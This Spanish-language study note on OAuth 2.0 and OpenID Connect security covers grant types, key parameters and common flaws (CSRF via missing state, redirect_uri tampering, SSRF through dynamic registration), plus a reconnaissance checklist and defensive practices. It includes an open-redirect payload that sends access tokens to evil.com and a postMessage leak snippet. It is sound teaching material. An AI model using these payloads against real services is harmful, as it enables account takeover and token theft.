# OAuth authentication

## 🔑 ¿Qué es la autenticación OAuth?

OAuth 2.0 fue diseñado para **autorización**, es decir, permitir que una aplicación acceda a ciertos datos de otro servicio en tu nombre. No fue pensado para autenticación (probar quién eres).

Sin embargo, muchos desarrolladores empezaron a usarlo para login: solicitan el email a Google y, si lo reciben, asumen que el usuario es quien dice ser.

Posteriormente se creó **OpenID Connect (OIDC)** sobre OAuth para estandarizar la autenticación, añadiendo ID Tokens y scopes uniformes.

### 🔍 Actores principales:

* **Cliente (Client Application)**: la web donde inicias sesión
* **Proveedor OAuth / Authorization Server**: quien te autentica (ej. Google)
* **Resource Server**: donde están tus datos (a menudo el mismo proveedor)

***

## 🔄 Tipos de Grant en OAuth

### 📜 Authorization Code Grant (aplicaciones backend)

1. El navegador solicita login al proveedor OAuth (client\_id, redirect\_uri, scope)
2. El usuario se autentica y da consentimiento
3. El proveedor redirige a `redirect_uri` con `?code=abc123`
4. El servidor del cliente intercambia el `code` + `client_secret` por un `access_token`
5. El servidor usa el token para obtener datos del usuario

El token no pasa por el navegador. El `client_secret` autentica servidor a servidor.

### ⚡ Implicit Grant (aplicaciones SPA)

1. El navegador solicita login (response\_type=token)
2. El usuario se autentica
3. El proveedor redirige con `#access_token=xyz` en la URL
4. JavaScript extrae el token y llama a la API

No hay `client_secret` ni canal seguro backend.

***

## 📌 Parámetros clave de OAuth

```http
GET /authorize?client_id=12345
              &redirect_uri=https://client-app.com/callback
              &response_type=code
              &scope=openid email profile
              &state=random789xyz
```

* **client\_id**: identificador único de la aplicación
* **redirect\_uri**: URL de retorno (principal vector de ataque)
* **response\_type**: `code` o `token`
* **scope**: datos solicitados
* **state**: token anti-CSRF asociado a la sesión

***

## ⚠️ Clases de vulnerabilidades

### 🔓 Bypass de autenticación (Implicit Flow)

* El navegador envía datos del usuario al servidor
* El servidor confía sin validar el token
* El atacante modifica email/usuario → acceso como otra persona

### 🔄 CSRF por falta de `state`

* El atacante inicia flujo OAuth con su cuenta
* Obtiene un `code`
* Envía el enlace a la víctima
* La cuenta del atacante queda vinculada a la víctima
* El atacante accede a la cuenta de la víctima

### 🕵️ Robo de Authorization Code (redirect\_uri)

* El atacante cambia `redirect_uri`
* Si no se valida correctamente, el `code` se envía al atacante
* Usa ese código para autenticarse como la víctima

### 🌐 Robo de Access Token mediante Open Redirect

Aunque no se pueda cambiar el dominio:

```
redirect_uri=/oauth-callback/../post/next?path=https://evil.com
```

* Se abusa de open redirect
* El token termina en el servidor del atacante

### 📤 Robo de token mediante Proxy Page

* Se encuentra una página que filtra la URL (ej. con postMessage)
* Se usa como `redirect_uri`
* El token se filtra a través de JavaScript

Ejemplo:

```javascript
parent.postMessage({data: window.location.href}, '*')
```

### 🌐 SSRF mediante registro dinámico (OIDC)

* OIDC permite registrar clientes vía `/registration`
* Si no requiere autenticación → cualquiera puede registrarse
* Propiedades como `logo_uri` o `jwks_uri` son cargadas por el servidor
* El atacante apunta a recursos internos → SSRF

***

## 🔗 OpenID Connect (OIDC)

OIDC extiende OAuth con autenticación estandarizada:

* **Scopes estándar**: openid, profile, email, etc.
* **ID Token**: JWT firmado con la identidad del usuario
* **Discovery**: `/.well-known/openid-configuration`
* **Registro dinámico**: endpoint `/registration`

***

## 🕵️ Checklist de reconocimiento

1. Interceptar tráfico con Burp durante el login OAuth
2. Buscar endpoints `/authorization` o `/auth`
3. Verificar si existe `state` (si no, posible CSRF)
4. Revisar `response_type` (`token` implica más riesgo)
5. Intentar modificar `redirect_uri`
6. Consultar `/.well-known/openid-configuration`
7. Comprobar si existe `/registration`
8. Buscar open redirects en el dominio del cliente

***

## 🛡️ Buenas prácticas de defensa

### ✅ Validar `redirect_uri`

* Usar whitelist exacta
* No permitir patrones, parámetros extra ni fragments
* Validar tanto en autorización como en intercambio de token

### 🔐 Usar el parámetro `state`

* Generar valor único y no predecible
* Asociarlo a la sesión del usuario
* Validarlo en la respuesta

### 🔍 Verificar tokens en el servidor

* No confiar en datos enviados por el navegador
* Validar que el token corresponde al usuario
* Preferir Authorization Code Flow frente a Implicit Flow

### 🛠️ Proteger el registro OpenID

* Requerir autenticación para `/registration`
* Validar todas las URLs (`logo_uri`, `jwks_uri`)
* Bloquear acceso a red interna desde el servidor
